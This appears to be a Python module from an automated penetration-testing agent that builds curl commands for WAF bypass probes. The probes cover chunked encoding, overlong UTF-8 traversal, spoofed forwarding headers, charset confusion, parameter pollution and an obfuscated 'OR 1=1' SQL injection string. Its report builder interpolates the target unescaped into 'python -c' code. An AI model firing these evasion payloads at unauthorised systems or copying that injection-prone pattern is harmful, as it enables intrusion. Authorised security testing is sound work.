"""
agents/firewall_bypass/command_builders.py

Pure Python command translators for FirewallBypassAgent actions.
Translates typed action parameter models into executable argument vectors.

SAFETY INVARIANTS:
  - Returns strictly List[List[str]]
  - Never shell strings
  - No shell=True
  - Cross-platform compatible
"""

import sys
from typing import List

from agents.firewall_bypass.actions import (
    WafFingerprintParams,
    RuleEnumParams,
    ChunkedEncodingParams,
    UnicodeNormalizationParams,
    HeaderMutationParams,
    ContentTypeConfusionParams,
    PathNormalizationParams,
    ParameterPollutionParams,
    PayloadMutationParams,
    WafBypassReportParams,
)


def build_waf_fingerprint(params: WafFingerprintParams) -> List[List[str]]:
    """Build command vector for WAF fingerprinting."""
    return [
        ["curl", "-s", "-I", "-k", "--max-time", "10", params.target]
    ]


def build_rule_enum(params: RuleEnumParams) -> List[List[str]]:
    """Build command vector for probing rule thresholds."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", "-X", "OPTIONS", url]
    ]


def build_chunked_encoding(params: ChunkedEncodingParams) -> List[List[str]]:
    """Build command vector for chunked transfer probe."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", "-H", "Transfer-Encoding: chunked", "-d", "0\r\n\r\n", url]
    ]


def build_unicode_normalization(params: UnicodeNormalizationParams) -> List[List[str]]:
    """Build command vector for Unicode normalization probe."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", "-G", url, "--data-urlencode", "q=%c0%ae%c0%ae/"]
    ]


def build_header_mutation(params: HeaderMutationParams) -> List[List[str]]:
    """Build command vector for IP forwarding and header mutation."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", "-H", "X-Forwarded-For: 127.0.0.1", "-H", "X-Originating-IP: 127.0.0.1", url]
    ]


def build_content_type_confusion(params: ContentTypeConfusionParams) -> List[List[str]]:
    """Build command vector for content type mismatch probe."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", "-H", "Content-Type: application/json; charset=ibm500", "-d", "{}", url]
    ]


def build_path_normalization(params: PathNormalizationParams) -> List[List[str]]:
    """Build command vector for semicolon and matrix path mutation."""
    url = f"{params.target.rstrip('/')}/;{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", url]
    ]


def build_parameter_pollution(params: ParameterPollutionParams) -> List[List[str]]:
    """Build command vector for duplicate parameter probe."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}?id=1&id=2"
    return [
        ["curl", "-s", "-k", url]
    ]


def build_payload_mutation(params: PayloadMutationParams) -> List[List[str]]:
    """Build command vector for benign obfuscated probe."""
    url = f"{params.target.rstrip('/')}/{params.endpoint.lstrip('/')}"
    return [
        ["curl", "-s", "-k", "-G", url, "--data-urlencode", "test=1/*probe*/OR/*probe*/1=1"]
    ]


def build_waf_bypass_report(params: WafBypassReportParams) -> List[List[str]]:
    """Build command vector for report generation."""
    return [
        [sys.executable, "-c", f"print('Generating WAF resilience and bypass audit report for {params.target}')"]
    ]

